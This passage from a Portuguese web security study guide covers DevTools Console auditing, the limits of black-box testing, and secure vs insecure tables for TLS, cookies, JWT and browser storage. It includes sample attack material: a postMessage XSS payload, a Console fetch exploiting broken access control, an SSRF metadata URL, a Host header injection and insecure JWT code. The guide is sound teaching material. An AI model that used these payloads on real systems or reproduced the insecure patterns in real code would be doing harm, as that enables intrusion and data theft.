- Pior ainda: o front-end exibe um aviso no Console `[WARN] Usuário não é admin; ocultando painel financeiro`, mas na aba **Network** a chamada `GET /v1/admin/financeiro` retornou **`200 OK`** com todos os dados financeiros da empresa, sendo bloqueada apenas por um `if (!user.isAdmin)` no JavaScript!

##### Exemplo prático

Ao carregar o painel de cliente comum, o Console registra:

```text
[RouterGuard] Acesso negado à rota /admin/relatorios no cliente (user.isAdmin === false). Redirecionando para /home...
XHR finished loading: GET "https://api.loja-ficticia.test/v1/relatorios/faturamento-anual".
```

**Diagnóstico**: O componente iniciou a busca dos dados (`GET /v1/relatorios/faturamento-anual`) **antes** de o guarda de rotas do front-end concluir o redirecionamento, e o servidor respondeu `200 OK` porque não validou a sessão administrativa no back-end. Basta olhar a requisição na aba **Network** (ou fazer `await (await fetch('/v1/relatorios/faturamento-anual')).json()` diretamente no Console) para ler todo o faturamento anual sem ser administrador.

---

<a id="s6-3-5"></a>
#### 6.3.5 Existem problemas de JavaScript que podem afetar a segurança?

Além de logs e erros de rede, o Console permite identificar práticas perigosas no próprio código JavaScript da página: uso de funções de avaliação dinâmica de código (`eval`), ouvintes de mensagens entre janelas (`postMessage`) sem validação de origem, poluição do objeto global `window`, avisos de **CORS** e alertas sobre recursos obsoletos ou vulneráveis.

##### Como verificar passo a passo

1. Verifique no Console se há mensagens de erro de **CORS** (`Access to fetch at '...' from origin '...' has been blocked by CORS policy...`) ou bloqueios de **CORP** / **COOP** / **COEP** ([Seções 5.7 a 5.9](./05-headers-de-seguranca.md#s5)).
2. Utilize funções utilitárias nativas da Command Line API do Console do Chrome DevTools para auditar a superfície de eventos da página:
   - Digite `getEventListeners(window)` no Console e pressione `Enter`.
   - Expanda a lista e verifique se existe um ouvinte registrado para o evento **`message`** (`window.addEventListener('message', ...)`).
   - Caso exista um ouvinte `message`, expanda `message[0].listener`, clique com o botão direito sobre a função exibida e selecione **Show function definition** (Mostrar definição da função). Isso levará você diretamente à linha de código na aba **Sources** para verificar se a função valida `event.origin` antes de processar `event.data`!
3. No Console, digite `window.` e observe no autocompletar (ou execute `Object.keys(window)`) se a aplicação expôs objetos globais sensíveis (como instâncias de banco de dados cliente, funções de debug `window.enableAdminMode()` ou tokens).
4. Verifique avisos de depreciação ou intervenção do navegador na aba **Console** (e na aba complementar **Issues**, representada pelo ícone de balão de fala/alerta ao lado da engrenagem), que aponta automaticamente problemas de *Mixed Content*, cookies *cross-site*, falta de **SRI** (*Subresource Integrity*) ou uso de APIs inseguras.

##### Resultado esperado (seguro)

- **[REQUISITO]** Ouvintes `window.addEventListener('message', handler)` verificam estritamente `if (event.origin !== 'https://origem-confiavel.test') return;` e nunca passam `event.data` para sumidouros perigosos (*sinks* de DOM XSS) como `innerHTML`, `eval()` ou `location.href`.
- **[RECOMENDAÇÃO]** O código não utiliza `eval()`, `new Function()`, nem `setTimeout("string", 100)` (o que pode ser comprovado ativando uma CSP sem `'unsafe-eval'`).
- **[BOA PRÁTICA]** Scripts carregados de CDNs externas possuem o atributo `integrity="sha384-..."` e `crossorigin="anonymous"` (**Subresource Integrity** — SRI), garantindo que se a CDN for invadida, o navegador recusará a execução do arquivo adulterado e emitirá um erro de integridade explícito no Console.

##### Sinais de alerta (inseguro)

- Ouvinte `message` em `getEventListeners(window)` cujo código executa `eval(event.data)` ou `document.getElementById('box').innerHTML = event.data.html` sem checar `event.origin`.
- Erros `Failed to find a valid digest in the 'integrity' attribute for resource...` (indicando que um script externo foi modificado em relação ao hash SRI esperado).
- Funções de desenvolvimento expostas no escopo global `window` (ex.: `window.debugAuth`, `window.bypassValidation = true`).

##### Exemplo prático

Executando uma auditoria rápida via REPL na aba **Console**:

```javascript
// 1. O auditor inspeciona os ouvintes globais da janela:
> getEventListeners(window).message
◀ [{listener: ƒ, useCapture: false, passive: false, once: false, type: 'message'}]

// 2. O auditor imprime o código-fonte do listener diretamente no Console:
> console.log(getEventListeners(window).message[0].listener.toString())
function (e) {
  // VULNERÁVEL: Não valida e.origin e injeta diretamente em innerHTML!
  if (e.data && e.data.widgetTitle) {
    document.querySelector('#promo-banner').innerHTML = e.data.widgetTitle;
  }
}
```

**Diagnóstico**: Em menos de 15 segundos pelo Console, o auditor descobriu uma vulnerabilidade clássica de **DOM-based XSS via `postMessage`** (veja [Seção 1.9.2](./01a-fundamentos-web-parte1.md#s1) e [Seção 3.2](./03a-vulnerabilidades-parte1.md#s3)). Qualquer página aberta em outra aba ou iframe pode enviar `targetWindow.postMessage({ widgetTitle: '<img src=x onerror=alert(document.domain)>' }, '*')` e executar código arbitrário no contexto da aplicação vulnerável.

---

<a id="s6-4"></a>
### 6.4 Limitações da Análise pelo Navegador (Caixa-Preta vs. Caixa-Branca)

Embora o Chrome DevTools seja uma ferramenta extraordinariamente poderosa para inspecionar a camada cliente-servidor visível ao navegador, **um estudante ou profissional de segurança jamais deve concluir que uma aplicação é "100% segura" apenas porque passou em todos os itens das abas Network, Application e Console**.

Do ponto de vista da engenharia de segurança, a inspeção pelo navegador é uma análise **Caixa-Preta (*Black-Box*) ou Caixa-Cinza (*Gray-Box*) a partir da perspectiva do cliente**. O navegador enxerga a **fachada e a fronteira de comunicação** (requisições HTTP enviadas, respostas HTTP recebidas e código front-end entregue), mas **não enxerga o que acontece dentro do servidor back-end, no banco de dados, nas filas de mensageria ou na infraestrutura em nuvem**.

##### Por que nem todas as vulnerabilidades podem ser confirmadas apenas com o DevTools?

Mesmo que uma aplicação utilize HTTPS (`h3`), envie todos os headers de segurança (`CSP`, `HSTS`, `X-Content-Type-Options`), configure cookies com `__Host-`, `HttpOnly`, `Secure` e `SameSite=Strict`, não armazene nada no `localStorage` e não apresente nenhum erro no Console, ela ainda pode conter vulnerabilidades críticas invisíveis na inspeção passiva do navegador:

1. **Armazenamento inseguro de senhas no banco de dados (*Cryptographic Failures*)**:
   - Quando você faz login, a aba **Network** mostra a senha saindo via `POST` sobre HTTPS e uma resposta `200 OK`. É **impossível** saber pelo DevTools se o servidor aplicou um algoritmo forte com *salt* (**Argon2id**, **bcrypt**, **scrypt** ou **PBKDF2**) ou se gravou a senha em `MD5` sem salt ou até em texto puro na tabela `usuarios` do banco de dados.
2. **Validação falha da assinatura de JWT no servidor**:
   - Na aba **Application** ou **Network**, você pode ver um JWT com cabeçalho `{"alg": "RS256", "typ": "JWT"}`. Porém, somente olhando o tráfego normal, você não sabe se o código back-end chama `jwt.verify(token, publicKey)` corretamente ou se usa `jwt.decode(token)` (que apenas decodifica o payload sem checar a assinatura criptográfica!) ou se aceita o algoritmo `"none"`.
3. **SQL Injection Cego (*Blind SQLi*) ou de Segunda Ordem (*Second-Order SQLi*)**:
   - Se o servidor trata exceções corretamente (retornando sempre mensagens genéricas sem *stack trace*), uma concatenação insegura de SQL não mostrará erros de banco na aba **Network**. Além disso, no *Second-Order SQLi* ou em rotinas assíncronas (um relatório noturno ou um *worker* que processa pedidos horas depois), o payload malicioso é salvo de forma silenciosa com `200 OK` e só explode em outro sistema interno fora da visão do navegador.
4. **Server-Side Request Forgery (SSRF) Cego (*Out-of-Band / Blind SSRF*)**:
   - Ao enviar uma URL de webhook na aba **Network**, o servidor pode responder apenas `{"status": "webhook agendado"}`, enquanto nos bastidores o servidor back-end faz uma requisição interna para o serviço de metadados da nuvem (`http://169.254.169.254/latest/meta-data/iam/security-credentials/`) sem refletir a resposta de volta para o navegador.
5. **Condições de Corrida (*Race Conditions* / TOCTOU — *Time-of-Check to Time-of-Use*)**:
   - Uma transferência bancária individual inspecionada na aba **Network** parece perfeitamente segura. A falha só se manifesta quando 30 requisições paralelas chegam ao servidor no mesmo milissegundo (usando multiplexação HTTP/2 *single-packet attack*) e o código back-end não utiliza transações atômicas nem bloqueio de linha (`SELECT ... FOR UPDATE`) no banco de dados.
6. **Command Injection e Desserialização Insegura Assíncrona**:
   - O upload de um arquivo PDF ou imagem pode retornar `202 Accepted` na aba **Network**, mas segundos depois um processo em segundo plano no servidor Linux executa `exec("convert " + nomeDoArquivo + " thumb.png")` de forma vulnerável.
7. **Vulnerabilidades em Dependências de Servidor (SCA) e Infraestrutura**:
   - Bibliotecas desatualizadas no back-end (ex.: Log4Shell em Java, vulnerabilidades em bibliotecas de parsing XML/YAML no Python ou Node.js), portas de banco de dados (`3306`, `5432`) abertas para a internet no firewall, permissões excessivas de **IAM** (*Identity and Access Management*) na nuvem ou falta de isolamento entre clientes (*multi-tenant isolation*) só são visíveis examinando o servidor e o código-fonte.

##### Comparativo Metodológico: Caixa-Preta vs. Caixa-Cinza vs. Caixa-Branca

| Característica | Teste Caixa-Preta (*Black-Box*) | Teste Caixa-Cinza (*Gray-Box*) | Teste Caixa-Branca (*White-Box*) |
| :--- | :--- | :--- | :--- |
| **Nível de conhecimento prévio** | Zero acesso ao código-fonte interno ou arquitetura; visão de um usuário externo anônimo. | Acesso parcial: credenciais de diferentes perfis (cliente, operador, admin), documentação da API (OpenAPI/Swagger) e visão de alto nível da arquitetura. | Acesso total ao código-fonte (front-end e back-end), esquemas de banco de dados, arquivos de infraestrutura como código (**IaC**) e configurações de servidor. |
| **Papel do Chrome DevTools** | **Essencial**: mapeamento inicial de endpoints, headers, cookies, código JS cliente e comportamento externo. | **Essencial**: comparação de respostas entre perfis para detectar **IDOR/BOLA** ([Seção 3.9](./03a-vulnerabilidades-parte1.md#s3)) e escalação de privilégios horizontal/vertical. | **Complementar**: usado para reproduzir e comprovar na prática falhas identificadas durante a leitura do código-fonte. |
| **O que enxerga bem** | Headers ausentes, cookies inseguros, *Mixed Content*, exposição excessiva de dados em JSON, XSS refletido/DOM, erros verbosos. | Falhas de autorização entre usuários/tenants, fluxos autenticados, lógica de negócios e persistência indevida no cliente após logout. | Hashing de senhas, queries SQL parametrizadas vs concatenadas, uso de CSPRNG, transações de banco, chamadas de sistema (`exec`), dependências vulneráveis. |
| **Principal limitação** | Não vê código de servidor que não reflete erros na resposta nem rotas ocultas sem links no cliente. | Ainda não vê detalhes internos de implementação criptográfica ou rotinas puramente internas de back-end sem revisão de código. | Exige mais tempo e especialização; um código que parece seguro estaticamente pode falhar por má configuração do proxy reverso em produção (por isso ainda precisa do teste dinâmico!). |

##### Como combinar a inspeção no navegador com práticas completas de AppSec

Em um programa maduro de **AppSec** (*Application Security* — Segurança de Aplicações) e **SSDLC** (*Secure Software Development Lifecycle* — Ciclo de Vida de Desenvolvimento Seguro de Software), o checklist do navegador deve ser combinado com cinco pilares complementares:

1. **SAST (*Static Application Security Testing* — Teste Estático de Segurança da Aplicação)**: ferramentas automatizadas (ex.: Semgrep, SonarQube, CodeQL) e revisão manual de código (*Code Review*) que analisam o código-fonte do back-end e front-end em busca de concatenação de SQL, funções de comando de sistema, segredos *hardcoded* (*Secret Scanning*) e algoritmos criptográficos fracos antes mesmo de a aplicação rodar.
2. **SCA (*Software Composition Analysis* — Análise de Composição de Software)**: verificação contínua dos arquivos de dependências (`package-lock.json`, `requirements.txt`, `pom.xml`, `go.mod`) contra bancos de dados de **CVEs** (*Common Vulnerabilities and Exposures* — Vulnerabilidades e Exposições Comuns), como `npm audit`, Dependabot, Snyk ou OWASP Dependency-Check.
3. **DAST (*Dynamic Application Security Testing* — Teste Dinâmico de Segurança da Aplicação)**: scanners automatizados (ex.: OWASP ZAP, Burp Suite Scanner, Nuclei) que interagem ativamente com a aplicação em execução em ambiente de homologação, enviando payloads de teste para descobrir falhas que a navegação passiva não aciona.
4. **IAST (*Interactive Application Security Testing*)**: instrumentação por agentes dentro do servidor de aplicação durante os testes automatizados, combinando a visão da requisição HTTP (como no DevTools/DAST) com o fluxo exato de execução e queries SQL dentro do servidor (como no SAST).
5. **Revisão de Arquitetura, Threat Modeling (Modelagem de Ameaças) e Pentest Autorizado**: avaliação humana especializada seguindo padrões de referência como o **OWASP ASVS** (*Application Security Verification Standard* — Padrão de Verificação de Segurança de Aplicações) e o **OWASP WSTG** (*Web Security Testing Guide* — Guia de Testes de Segurança Web), indispensáveis para encontrar falhas de lógica de negócios, condições de corrida e problemas complexos de controle de acesso.

> [!TIP]
> **Resumo para a Prova — Quadro Rápido de Auditoria no DevTools**:
> - **Na aba Network**: procure por `scheme:http` (falta de TLS), senhas/tokens/CPF na URL, `Set-Cookie` sem `HttpOnly`/`Secure`/`SameSite`, ausência de `CSP`/`HSTS`/`X-Content-Type-Options`, JSON retornando campos demais (*Excessive Data Exposure*), erros `500` vazando *stack trace* / versões em `Server`/`X-Powered-By`, e `Access-Control-Allow-Origin` refletindo origem arbitrária com `Access-Control-Allow-Credentials: true`.
> - **Na aba Application**: procure por JWT ou *refresh tokens* em `Local Storage`/`Session Storage`/`IndexedDB`, colunas `HttpOnly` e `Secure` vazias na tabela `Cookies`, dados pessoais (PII) que continuam gravados após o *logout*, e `Service Workers` / `Cache Storage` salvando respostas de APIs autenticadas.
> - **Na aba Console**: procure por *stack traces* com caminhos internos ou nomes de bancos, `console.log()` esquecidos com tokens/senhas (ative o nível *Verbose*!), mensagens de bloqueio ou `[Report Only]` de `CSP`, chamadas de API retornando `401`/`403` para rotas de admin ocultas apenas no front-end, e ouvintes `postMessage` (`getEventListeners(window).message`) sem validação de `event.origin`.

---

<a id="s7"></a>
## 7. Comparativo: Seguro vs. Inseguro

Em provas acadêmicas de Desenvolvimento Web, Segurança da Informação e Redes de Computadores — bem como em revisões técnicas de arquitetura e auditorias práticas —, a habilidade mais exigida é **contrastar imediatamente um padrão vulnerável com sua contraparte segura**, compreendendo não apenas *o que mudar*, mas *qual o risco exato* que aquela falha introduz.

Esta seção consolida todo o conteúdo estudado ao longo da apostila ([Fundamentos Web](./01a-fundamentos-web-parte1.md#s1), [Chrome DevTools](./02a-devtools-network.md#s2), [Vulnerabilidades](./03a-vulnerabilidades-parte1.md#s3), [Redes](./04-redes-de-computadores.md#s4) e [Headers de Segurança](./05-headers-de-seguranca.md#s5)) em sete matrizes comparativas organizadas por domínio tecnológico, acompanhadas de exemplos de implementação lado a lado e classificadas segundo o nível de exigência (**[REQUISITO]**, **[RECOMENDAÇÃO]** e **[BOA PRÁTICA]**).

---

<a id="s7-1"></a>
### 7.1 Transporte, Protocolos, Métodos e URLs

Esta matriz aborda a camada de comunicação HTTP/HTTPS, o uso semântico correto dos verbos HTTP (RFC 9110), o endereçamento de recursos e a proteção em trânsito.

| Elemento / Cenário | Configuração ou Prática Insegura (Com Exemplo) | Risco / Impacto Principal | Configuração ou Prática Segura (Com Exemplo) |
| :--- | :--- | :--- | :--- |
| **Protocolo de transporte web** | Servir páginas ou APIs sobre HTTP em texto claro (`http://loja-ficticia.test/login`). | Interceptação passiva (*sniffing*) de senhas, cookies e dados pessoais; adulteração ativa de pacotes em trânsito (**MITM**). | **[REQUISITO]** Servir 100% do tráfego sobre **HTTPS** (`https://loja-ficticia.test/login`) utilizando **TLS 1.3** (RFC 8446) ou TLS 1.2 com cifras **AEAD** (*Authenticated Encryption with Associated Data*). |
| **Versão do TLS e suítes de cifra** | Aceitar protocolos obsoletos (`SSLv3`, `TLS 1.0`, `TLS 1.1` — `[Obsoleto]`) ou cifras fracas (`RC4`, `3DES`, `CBC` sem *Forward Secrecy*). | Ataques de downgrade e decifração (POODLE, BEAST, Lucky13); comprometimento da chave privada do servidor decifra todo o tráfego passado gravado. | **[REQUISITO]** Desativar SSLv2/v3 e TLS 1.0/1.1; exigir **TLS 1.2+** com troca de chaves efêmera (**ECDHE** — *Elliptic Curve Diffie-Hellman Ephemeral*) garantindo *Forward Secrecy* e cifras `AES-GCM` ou `ChaCha20-Poly1305`. |
| **Transição inicial HTTP para HTTPS** | Redirecionar via JavaScript (`location.href = 'https://...'`) ou emitir `Set-Cookie` já na resposta HTTP `302` antes do TLS. | A primeira requisição ainda sai em texto claro; um atacante na rede local intercepta a primeira chamada (**SSL Stripping**) ou captura o cookie emitido antes do HTTPS. | **[REQUISITO]** Redirecionar no servidor/proxy com `301 Moved Permanently` (ou `308 Permanent Redirect`) sem emitir cookies em HTTP, aliado ao cabeçalho **HSTS** (`Strict-Transport-Security: max-age=63072000; includeSubDomains; preload`). |
| **Sub-recursos em páginas HTTPS (*Mixed Content*)** | Página `https://` carregando `<script src="http://cdn.exemplo.test/app.js">` ou `<img src="http://...">`. | Scripts ou estilos em HTTP permitem tomada total da página segura por um intermediário na rede; imagens em HTTP vazam metadados de navegação. | **[REQUISITO]** Carregar todos os sub-recursos exclusivamente via `https://` e incluir `Content-Security-Policy: upgrade-insecure-requests`. |
| **WebSockets em tempo real** | Abrir conexão `new WebSocket("ws://api.loja-ficticia.test/chat")` para enviar mensagens e tokens. | Tráfego bidirecional em texto claro, sujeito a leitura e injeção de frames WebSocket na rede local. | **[REQUISITO]** Utilizar obrigatoriamente **WSS** (*WebSocket Secure* sobre TLS): `new WebSocket("wss://api.loja-ficticia.test/chat")`. |
| **Transmissão de credenciais e dados sensíveis** | Enviar senha, CPF ou token na *query string* de um `GET`: `GET /api/login?email=a@b.com&senha=123`. | Exposição permanente em logs de servidores/proxies, histórico do navegador, sistemas de analytics e cabeçalho `Referer`. | **[REQUISITO]** Enviar credenciais no corpo (*Request Payload*) de uma requisição `POST` sobre HTTPS (`Content-Type: application/json`) e tokens em headers (`Authorization` ou `Cookie`). |
| **Semântica de métodos HTTP para ações de escrita** | Usar `GET` para ações que alteram estado no servidor: `GET /api/usuarios/42/deletar` ou `GET /api/transferir?para=99&valor=500`. | Execução acidental por *pre-fetching* do navegador, rastreadores de busca (*crawlers*) ou exploração trivial de **CSRF** via simples tag `<img src="https://.../deletar">`. | **[REQUISITO]** Respeitar a semântica da RFC 9110: `GET` e `HEAD` devem ser estritamente **seguros (*safe*)** (somente leitura); usar `POST`, `PUT`, `PATCH` ou `DELETE` para mutações de estado. |
| **Métodos HTTP de diagnóstico desnecessários** | Deixar o método `TRACE` ou métodos WebDAV (`PROPFIND`, `PUT` arbitrário) habilitados no servidor web. | `TRACE` reflete a requisição de volta ao cliente, podendo expor cabeçalhos em cenários de *Cross-Site Tracing* (**XST**) ou proxies mal configurados. | **[RECOMENDAÇÃO]** Desabilitar `TRACE`/`TRACK` no servidor web (ex.: `TraceEnable off` no Apache) e retornar `405 Method Not Allowed` para verbos não suportados pela rota. |
| **Redirecionamento controlado por parâmetro (*Open Redirect*)** | Redirecionar diretamente para qualquer URL informada na query string: `GET /redirect?next=https://phishing.test`. | Abuso da reputação e do certificado HTTPS do domínio legítimo para conduzir vítimas a páginas falsas de captura de credenciais ou roubar códigos OAuth. | **[REQUISITO]** Permitir apenas caminhos relativos internos validados (iniciados por uma única `/` seguida de caractere alfanumérico, bloqueando `//dominio.test`) ou validar o destino contra uma *allowlist* estrita de domínios. |
| **Cabeçalho `Host` da requisição HTTP** | Usar o valor não validado de `req.headers.host` para montar links de recuperação de senha enviados por e-mail (`https://${req.headers.host}/reset?t=...`). | **Host Header Injection**: o atacante envia `Host: atacante.test` ao solicitar reset de senha da vítima; a vítima recebe um e-mail legítimo com link apontando para `atacante.test` contendo seu token secreto. | **[REQUISITO]** Utilizar uma constante de configuração fixa do ambiente no servidor (`process.env.APP_PUBLIC_URL`) para gerar links absolutos e configurar um bloco *default_server* no proxy reverso que rejeite headers `Host` desconhecidos (`444` / `421`). |

##### Exemplo Comparativo de Transporte e Método HTTP

```http
# ❌ INSEGURO: Ação de alteração de estado e credenciais via GET em HTTP plano
GET /api/v1/conta/alterar-email?novoEmail=invasor@exemplo.test&senhaAtual=Segredo123 HTTP/1.1
Host: loja-ficticia.test

# ✅ SEGURO: Método semântico POST/PATCH sobre HTTPS (HTTP/2), credenciais no corpo e CSRF token
PATCH /api/v1/conta/email HTTP/2
Host: api.loja-ficticia.test
Cookie: __Host-sid=9f8e7d6c5b4a3f2e1d0c9b8a7f6e5d4c
X-CSRF-Token: 4b8e2a1f-9c3d-4e5a-8b7c-1d2e3f4a5b6c
Content-Type: application/json

{
  "novoEmail": "aluno.novo@exemplo.test",
  "senhaAtual": "Segredo123"
}
```

---

<a id="s7-2"></a>
### 7.2 Cookies, Sessões, Tokens (JWT) e Autenticação

Esta matriz contrasta práticas vulneráveis e seguras no gerenciamento de identidade, ciclo de vida de sessões, configuração de cookies (RFC 6265bis), implementação de **JWT** (RFC 7519) e armazenamento de senhas.

| Elemento / Cenário | Configuração ou Prática Insegura (Com Exemplo) | Risco / Impacto Principal | Configuração ou Prática Segura (Com Exemplo) |
| :--- | :--- | :--- | :--- |
| **Atributos do cookie de sessão** | `Set-Cookie: sid=12345abc; Path=/` (sem `HttpOnly`, sem `Secure` e sem `SameSite`). | Roubo do cookie via JavaScript (`document.cookie`) em ataques de **XSS**; vazamento em conexões HTTP; envio automático em ataques de **CSRF**. | **[REQUISITO]** `Set-Cookie: __Host-sid=<valor_aleatorio_256bits>; Path=/; Secure; HttpOnly; SameSite=Lax; Max-Age=3600`. |
| **Escopo de domínio do cookie (`Domain`)** | Definir `Domain=.exemplo.test` em um cookie de sessão crítica de `ibank.exemplo.test`. | Qualquer subdomínio menos protegido (`blog.exemplo.test` ou um subdomínio abandonado vítima de *Subdomain Takeover*) pode ler cookies não-HttpOnly ou realizar *cookie tossing* (sobrescrever o cookie). | **[RECOMENDAÇÃO]** Omitir o atributo `Domain` (tornando o cookie **host-only**, restrito exclusivamente a `ibank.exemplo.test`) e utilizar o prefixo `__Host-`. |
| **Geração do identificador de sessão** | IDs sequenciais, baseados em timestamp ou `Math.random()`: `sid=100045` ou `sid=md5(email)`. | Previsibilidade do token; um atacante enumera valores vizinhos (`100046`, `100047`) e sequestra sessões ativas (**Session Hijacking**). | **[REQUISITO]** Gerar identificadores de sessão no servidor com um **CSPRNG** (`crypto.randomBytes(32)` no Node.js ou `secrets.token_urlsafe(32)` no Python), com no mínimo 128 bits de entropia. |
| **Renovação de sessão no login (*Session Fixation*)** | Manter o mesmo `session_id` que o visitante tinha antes de se autenticar após o login bem-sucedido. | **Session Fixation** ([Seção 3.15](./03a-vulnerabilidades-parte1.md#s3)): o atacante fixa um ID conhecido no navegador da vítima antes do login e passa a usar a sessão autenticada depois que a vítima entra. | **[REQUISITO]** Sempre **regenerar o ID de sessão** (`req.session.regenerate()`) imediatamente após o login bem-sucedido e em qualquer mudança de nível de privilégio. |
| **Validação de JWT no servidor** | Usar `jwt.decode(token)` em vez de `jwt.verify()`, ou aceitar o algoritmo indicado no próprio cabeçalho do token sem restringir algoritmos permitidos. | Ataque de **algoritmo `none`** (`{"alg":"none"}`) ou confusão de chave assimétrica/simétrica (`RS256` -> `HS256`), permitindo forjar tokens administrativos sem possuir a chave privada. | **[REQUISITO]** Usar `jwt.verify(token, key, { algorithms: ['RS256'], issuer: 'https://auth.exemplo.test', audience: 'api.exemplo.test' })`, fixando explicitamente o algoritmo esperado no servidor. |
| **Segredo de assinatura JWT (`HS256`)** | Assinar JWT com segredo curto ou de dicionário: `JWT_SECRET="secret123"` ou `"minhaempresa"`. | Quebra *offline* por força bruta com ferramentas de GPU (Hashcat / John the Ripper) a partir de um único JWT capturado, permitindo forjar tokens para qualquer `user_id`. | **[REQUISITO]** Para `HS256`, usar chave criptográfica aleatória de pelo menos 256 bits (32 bytes aleatórios); ou preferir algoritmos assimétricos (`RS256`, `ES256`, `EdDSA`). |
| **Conteúdo do payload do JWT** | Colocar senha, hash de senha, CPF ou segredos internos dentro do payload do JWT achando que Base64URL é criptografia. | O payload de um **JWS** (*JSON Web Signature*) é apenas codificado em Base64URL: qualquer pessoa que veja o token decodifica e lê todos os dados instantaneamente. | **[REQUISITO]** Incluir no payload apenas identificadores mínimos (`sub`, `iss`, `aud`, `exp`, `iat`, `jti`); se a confidencialidade do payload for necessária, usar **JWE** (*JSON Web Encryption*) ou token opaco. |
| **Tempo de vida e revogação de tokens** | Emitir JWT sem claim `exp` ou com `exp` de 30 dias sem mecanismo de revogação. | Um token roubado permanece válido por um mês inteiro, mesmo que o usuário faça *logout* ou altere a própria senha. | **[RECOMENDAÇÃO]** *Access tokens* curtos (5 a 15 minutos) combinados com *Refresh tokens* armazenados em cookie `HttpOnly` com **rotação de refresh token** e invalidação em *deny-list* (Redis) no logout/troca de senha. |
| **Armazenamento de senhas no banco de dados** | Salvar senhas em texto plano, codificadas em Base64, criptografadas com chave reversível ou com hashes rápidos (`MD5(senha)`, `SHA1(senha)`, `SHA256(senha)`). | Em caso de vazamento do banco (ex.: via SQLi ou backup exposto), GPUs modernas quebram bilhões de hashes SHA-256 por segundo usando *Rainbow Tables* ou força bruta. | **[REQUISITO]** Aplicar algoritmo de hashing de senhas lento e intensivo em memória com *salt* único por usuário: **Argon2id** (primeira escolha OWASP), **bcrypt** (custo $\ge$ 12), **scrypt** ou **PBKDF2-HMAC-SHA256** ($\ge$ 600.000 iterações). |
| **Proteção contra força bruta no login** | Endpoint `POST /login` sem limite de tentativas e retornando `"E-mail não cadastrado"` vs `"Senha incorreta para este e-mail"`. | Enumeração de usuários válidos e ataque de força bruta / *Credential Stuffing* automatizado em milhares de contas por minuto. | **[REQUISITO]** Mensagem de erro unificada (`"Credenciais inválidas"`), tempo de resposta constante (`crypto.timingSafeEqual`), **Rate Limiting** por IP/conta (HTTP `429 Too Many Requests`) e **MFA** (*Multi-Factor Authentication*). |

##### Exemplo Comparativo de Emissão de Sessão e Validação de JWT (Node.js)

```javascript
// ❌ INSEGURO: Segredo fraco, sem algoritmo fixo, token exposto ao JS por 30 dias
const token = jwt.sign(
  { userId: user.id, role: user.role, cpf: user.cpf, passwordHash: user.hash },
  'segredo123',
  { expiresIn: '30d' }
);
res.cookie('token', token); // Sem HttpOnly, sem Secure, sem SameSite!

// Na validação (VULNERÁVEL a alg: none ou chave fraca):
const decoded = jwt.decode(req.cookies.token); // NÃO verifica assinatura!
```

```javascript
// ✅ SEGURO: Payload mínimo, chave assimétrica (ES256/RS256), expiração curta e cookie blindado
const accessToken = jwt.sign(
  { sub: String(user.id), role: user.role },
  PRIVATE_KEY_PEM,
  {
    algorithm: 'RS256',
    issuer: 'https://auth.loja-ficticia.test',
    audience: 'https://api.loja-ficticia.test',
    expiresIn: '15m',
    jwtid: crypto.randomUUID()
  }
);

res.cookie('__Host-access_token', accessToken, {
  httpOnly: true,
  secure: true,
  sameSite: 'lax',
  path: '/',
  maxAge: 15 * 60 * 1000
});

// Na validação no servidor:
const payload = jwt.verify(req.cookies['__Host-access_token'], PUBLIC_KEY_PEM, {
  algorithms: ['RS256'], // Rejeita 'none' e 'HS256'
  issuer: 'https://auth.loja-ficticia.test',
  audience: 'https://api.loja-ficticia.test'
});
```

---

<a id="s7-3"></a>
### 7.3 Armazenamento no Navegador e Cache

Esta matriz compara o uso seguro e inseguro das tecnologias de persistência no cliente (**Local Storage**, **Session Storage**, **IndexedDB**, **Service Workers**) e das políticas de cache HTTP (`Cache-Control`).

| Elemento / Cenário | Configuração ou Prática Insegura (Com Exemplo) | Risco / Impacto Principal | Configuração ou Prática Segura (Com Exemplo) |
| :--- | :--- | :--- | :--- |
| **Armazenamento de tokens de autenticação** | `localStorage.setItem('jwt', token)` ou salvar *refresh tokens* no `IndexedDB`. | Qualquer vulnerabilidade de **XSS** (ou script de terceiro comprometido na página) lê `localStorage.getItem('jwt')` com uma linha de código e exfiltra a sessão. | **[RECOMENDAÇÃO]** Armazenar tokens de sessão e *refresh tokens* em cookies `HttpOnly; Secure; SameSite=Lax/Strict`; manter dados voláteis apenas em memória JS. |
| **Uso do `localStorage` e `sessionStorage`** | Persistir o objeto completo do usuário (`nome`, `cpf`, `endereco`, `cartoes`) via `redux-persist` no `localStorage`. | Exposição permanente de **PII** em computadores compartilhados mesmo após fechar a aba; violação de princípios de minimização de dados (LGPD). | **[BOA PRÁTICA]** Usar `localStorage` exclusivamente para preferências de interface não sensíveis (`theme: "dark"`, `lang: "pt-BR"`, `gridColumns: 4`). |
| **Limpeza de dados no Logout** | O botão "Sair" apenas redireciona para `/login` ou apaga uma única chave, deixando `sessionStorage`, `IndexedDB` e cache intactos. | O próximo usuário do computador inspeciona a aba **Application** ou clica no botão "Voltar" do navegador e visualiza dados da sessão anterior. | **[REQUISITO]** Invalidar a sessão no servidor, sobrescrever cookies com `Max-Age=0`, limpar `localStorage`/`sessionStorage`/`IndexedDB` e enviar o header `Clear-Site-Data: "cache", "cookies", "storage"`. |
| **Cache HTTP em respostas autenticadas/privadas** | Retornar `Cache-Control: public, max-age=3600` (ou omitir `Cache-Control`) em `GET /api/v1/meu-extrato`. | Caches compartilhados (CDNs, proxies corporativos) ou o `(disk cache)` local podem armazenar e entregar o extrato bancário de um usuário para outro (**Web Cache Deception**). | **[REQUISITO]** Enviar `Cache-Control: no-store, no-cache, must-revalidate, private` e `Pragma: no-cache` em todas as respostas contendo dados pessoais ou autenticados. |
| **Cache HTTP em arquivos estáticos públicos** | Servir `app.bundle.js` sempre com o mesmo nome sem hash de versão e `Cache-Control: max-age=31536000`. | Quando uma correção urgente de segurança é publicada no JS, os navegadores dos clientes continuam executando a versão vulnerável em cache por até 1 ano. | **[BOA PRÁTICA]** Usar *cache busting* com hash no nome do arquivo (`app.8f9a2b.js`) combinado com `Cache-Control: public, max-age=31536000, immutable` para os bundles versionados, e `Cache-Control: no-cache` para o `index.html`. |
| **Interceptação de APIs por Service Worker** | Service Worker cacheando todas as requisições `GET /api/*` indiscriminadamente no **Cache Storage**. | Respostas confidenciais ficam persistidas em texto claro em **Application** -> **Cache Storage**, acessíveis sem autenticação após o logout. | **[REQUISITO]** Configurar o Service Worker para cachear apenas ativos estáticos da interface (*App Shell*) e excluir explicitamente rotas `/api/*` e `/auth/*` do cache em disco. |
